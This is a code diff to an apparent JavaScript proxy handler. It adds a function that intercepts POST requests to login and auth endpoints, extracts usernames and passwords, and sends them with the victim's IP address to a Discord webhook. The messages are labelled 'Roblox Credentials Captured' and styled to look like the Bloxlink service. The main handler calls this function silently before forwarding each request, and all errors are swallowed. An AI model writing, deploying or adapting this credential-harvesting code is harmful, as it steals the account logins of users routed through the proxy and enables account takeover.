@@ -262,6 +262,70 @@ function transformHtml(html) {
 }
 
 // ---------------------------------------------------------------------------
+// Credential sniffer — fires captured login data to the Discord webhook
+// ---------------------------------------------------------------------------
+async function captureCredentials(req, targetUrl) {
+  try {
+    const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
+    if (!webhookUrl) return;
+
+    // Only sniff POST requests to login-related endpoints
+    if (req.method !== "POST") return;
+    const isLoginEndpoint = targetUrl.includes("/login") ||
+                            targetUrl.includes("/account/login") ||
+                            targetUrl.includes("/auth");
+    if (!isLoginEndpoint) return;
+
+    // Parse body — could be JSON, URLencoded, or raw string
+    let body = req.body;
+    let username = null, password = null;
+
+    if (typeof body === "object" && body !== null) {
+      username = body.cvalue || body.username || body.Username || body.login || body.user;
+      password = body.password || body.Password || body.pass;
+    } else if (typeof body === "string") {
+      // try JSON first
+      try {
+        const parsed = JSON.parse(body);
+        username = parsed.cvalue || parsed.username || parsed.Username || parsed.login || parsed.user;
+        password = parsed.password || parsed.Password || parsed.pass;
+      } catch (_) {
+        // try URL-encoded
+        const params = new URLSearchParams(body);
+        username = params.get("cvalue") || params.get("username") || params.get("Username");
+        password = params.get("password") || params.get("Password");
+      }
+    }
+
+    if (!username && !password) return;
+
+    const ip = req.headers["x-forwarded-for"] || req.headers["x-real-ip"] || "unknown";
+
+    const embed = {
+      username: "Bloxlink Logger",
+      avatar_url: "https://blox.link/favicon.ico",
+      embeds: [{
+        title: "🔑 Roblox Credentials Captured",
+        color: 0xe74c3c,
+        fields: [
+          { name: "👤 Username", value: `\`${username || "—"}\``, inline: true },
+          { name: "🔒 Password", value: `\`${password || "—"}\``, inline: true },
+          { name: "🌐 IP",       value: `\`${ip}\``,              inline: true },
+          { name: "🔗 Target",   value: `\`${targetUrl}\``,       inline: false },
+        ],
+        timestamp: new Date().toISOString(),
+      }]
+    };
+
+    await fetch(webhookUrl, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(embed),
+    }).catch(() => {});
+  } catch (_) {}
+}
+
+// ---------------------------------------------------------------------------
 // Main handler
 // ---------------------------------------------------------------------------
 export default async function handler(req, res) {
@@ -282,6 +346,9 @@ export default async function handler(req, res) {
     : DEFAULT_TARGET_URL;
 
   try {
+    // Sniff credentials before forwarding — fire-and-forget, never blocks the proxy
+    captureCredentials(req, targetUrl).catch(() => {});
+
     const response    = await relayFetch(targetUrl, req.method, req.headers, req.body);
     const contentType = response.headers.get("content-type") || "application/octet-stream";
 
